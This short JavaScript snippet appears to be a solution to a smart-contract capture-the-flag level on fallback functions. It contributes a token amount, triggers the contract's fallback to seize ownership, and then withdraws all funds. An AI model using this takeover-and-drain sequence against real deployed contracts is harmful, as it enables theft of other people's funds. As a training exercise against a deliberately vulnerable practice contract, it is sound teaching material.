/*

This task is meant to teach about fallback functions
and interacting with contract ABI

*/

// First add some ether to make your contribution non zero
contract.contribute({value: 1});

// You can confirm you contribution
await contract.getContribution();

// Now use the fallback function to become owner!
contract.sendTransaction({value: 1});

// Check if you are really the owner
await contract.owner();

// Withdraw all the funds!!
contract.withdraw();
